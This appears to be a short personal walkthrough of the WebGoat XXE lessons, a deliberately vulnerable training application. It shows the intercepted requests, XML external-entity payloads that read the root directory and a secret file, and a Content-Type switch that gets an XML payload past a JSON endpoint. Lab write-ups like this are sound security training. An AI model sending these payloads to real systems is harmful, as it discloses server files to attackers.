## XXE
Let’s try
When the comment “comment” POST request is captured by ZAP, it contains:
```xml
<?xml version="1.0"?>
<comment>
  <text>comment</text>
</comment>
```
Adding proper entity to it:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY root SYSTEM "file:///">
]>
<comment>
  <text>&root;</text>
</comment>
```
results in
```json
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations. You have successfully completed the assignment.",
  "output" : null
}
```
response and nice comment on the page:
![](Img/xxe_root.png)
that contains the content of root directory. Which is nice.

### Modern REST framework
When the comment “comment” POST request is captured by ZAP, it contains:
```json
{"text":"comment"}
```
Changing that to the previous XML attack:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY root SYSTEM "file:///">
]>
<comment>
  <text>&root;</text>
</comment>
```
results in
```json
{
  "lessonCompleted" : false,
  "feedback" : "You are posting JSON which does not work with a XXE",
  "output" : null
}
```
but catching that again and this time updating Content-Type: application/json to Content-Type: application/xml with the same XML content, results in:
```json
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations. You have successfully completed the assignment.",
  "output" : null
}
```
and again posting comment with root directory content.

### Blind XEE
Similar to first XEE, with the difference of the file path provided in the entity.
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///home/user/.webgoat/XXE/secret.txt" >
]>
<comment>
  <text>XXE goes here. &xxe;</text>
</comment>
```
